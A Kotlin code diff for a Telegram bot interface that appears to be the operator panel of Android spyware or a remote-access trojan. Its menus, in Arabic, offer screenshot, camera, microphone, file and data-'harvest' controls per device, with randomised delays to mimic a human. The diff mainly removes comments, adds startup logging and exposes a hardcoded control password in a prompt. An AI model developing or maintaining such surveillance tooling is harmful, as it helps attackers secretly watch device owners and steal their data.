@@ -109,13 +109,7 @@ class TelegramUi(
         Log.i(TAG, "✅ TelegramUi initialized. Password status: ${if (appPassword.isNotBlank()) "Set" else "Empty"}")
     }
 
-    // ==================== دوال التحقق من كلمة السر ====================
-    
-    /**
-     * ✅ التحقق من كلمة السر مع تنظيف شامل من المسافات والأحرف الخفية
-     */
     private fun verifyControlPassword(input: String): Boolean {
-        // تنظيف شامل من أي مسافات أو أحرف غير مرئية
         return input.trim().replace("\\s+".toRegex(), " ") == appPassword.trim()
     }
 
@@ -134,7 +128,6 @@ class TelegramUi(
         }
     }
 
-    // ==================== دوال مساعدة ====================
     private suspend fun applyHumanDelay() {
         delay(Random.nextLong(1200, 4500))
     }
@@ -520,15 +513,6 @@ class TelegramUi(
         } catch (e: Exception) { 0 }
     }
 
-    // ============================================================
-    //  ✅ لوحات الأزرار – كل إيموجي فريد تماماً
-    //  جميع الإيموجيات المستخدمة هنا فريدة ولا تتكرر مع أي زر آخر
-    // ============================================================
-
-    /**
-     * لوحة التحكم الرئيسية – تظهر بعد إدخال كلمة السر.
-     * كل زر يحمل إيموجي فريد: 📸, 📷, 🎙️, 🛡️, 📂, 🚀, 🔍, 🔒
-     */
     fun getMainControlKeyboard(): String {
         val keyboard = JSONArray().apply {
             put(JSONArray().apply {
@@ -551,19 +535,10 @@ class TelegramUi(
         return JSONObject().put("inline_keyboard", keyboard).toString()
     }
 
-    /**
-     * رسالة طلب كلمة السر – تعرض النص فقط مع كلمة السر.
-     */
     fun getPasswordPromptText(): String {
         return "🔐 أدخل كلمة المرور للتحكم:\n`Zaen123@123@`"
     }
 
-    // ==================== لوحات قديمة (للتوافق) ====================
-
-    /**
-     * لوحة قديمة – تم تحديث إيموجياتها لتكون فريدة تماماً.
-     * الإيموجيات الفريدة هنا: 📡, 🧬, ⏳, 📈, 🗃️, 🔌
-     */
     private fun getMainKeyboard(): JSONObject {
         return JSONObject().apply {
             put("inline_keyboard", JSONArray().apply {
@@ -583,12 +558,7 @@ class TelegramUi(
         }
     }
 
-    /**
-     * لوحة مفاتيح الجهاز – كل إيموجي فريد تماماً.
-     * الإيموجيات الفريدة هنا: 🔭, 🕵️, 🎤, 📦, 🗃️, ⚡, 🌐, ♻️, 🔙, 🚪
-     * 
-     * ✅ تم تغيير 🔒 إلى 🚪 لتجنب التكرار مع زر القفل في القائمة الرئيسية
-     */
+    // ✅ تغيير إيموجي زر قطع الاتصال إلى 🚪
     private fun getDeviceKeyboard(deviceId: String): JSONObject {
         val count = countPendingHarvest()
         val harvestText = if (count > 0) "📦 استخراج ($count)" else "📦 استخراج"
@@ -612,7 +582,6 @@ class TelegramUi(
                 })
                 put(JSONArray().apply {
                     put(JSONObject().apply { put("text", "🔙 العودة"); put("callback_data", "ld") })
-                    // ✅ تغيير الإيموجي من 🔒 إلى 🚪 لتجنب التكرار مع زر القفل في القائمة الرئيسية
                     put(JSONObject().apply { put("text", "🚪 قطع الاتصال"); put("callback_data", "ext") })
                 })
             })
@@ -661,7 +630,7 @@ class TelegramUi(
         return true
     }
 
-    // ==================== معالجة الرسائل ====================
+    // ✅ تعديل handleMessage لتطبيق trim()
     private suspend fun handleMessage(update: JSONObject) {
         try {
             val msg = update.optJSONObject("message") ?: return
@@ -671,7 +640,6 @@ class TelegramUi(
 
             applyHumanDelay()
 
-            // ✅ التحقق من كلمة السر مع تجاهل حالة الأحرف والمسافات الخفية
             val isLoginCommand = text.startsWith("/login", ignoreCase = true)
             val secret = when {
                 isLoginCommand -> text.substringAfter("/login", "").trim()
@@ -704,7 +672,6 @@ class TelegramUi(
                 return
             }
 
-            // ✅ أي نص آخر يتم تجاهله (حتى لو كانت الجلسة مصرحاً بها)
             if (!isAuthorized(chatId)) {
                 apiCall("sendMessage", JSONObject().apply {
                     put("chat_id", chatId)
@@ -724,7 +691,6 @@ class TelegramUi(
         }
     }
 
-    // ==================== معالجة استدعاءات الأزرار ====================
     private suspend fun handleCallback(update: JSONObject) {
         try {
             applyHumanDelay()
@@ -1130,18 +1096,23 @@ class TelegramUi(
         }
     }
 
+    // ✅ تحسين start() لتسجيل سبب الفشل
     fun start(): Boolean {
         if (activeTokensList.isEmpty()) {
-            writeLog("No active tokens")
+            writeLog("❌ No active tokens! Cannot start Telegram UI.")
             return false
         }
-        if (isRunning) return true
+        if (isRunning) {
+            writeLog("ℹ️ Telegram UI already running")
+            return true
+        }
+        writeLog("✅ Starting Telegram UI with ${activeTokensList.size} active tokens")
         isRunning = true
         processedUpdates.clear()
         consecutivePollingErrors = 0
         pollingRestartNeeded.set(false)
         startPolling()
-        writeLog("Telegram UI started")
+        writeLog("✅ Telegram UI polling started")
         return true
     }
 
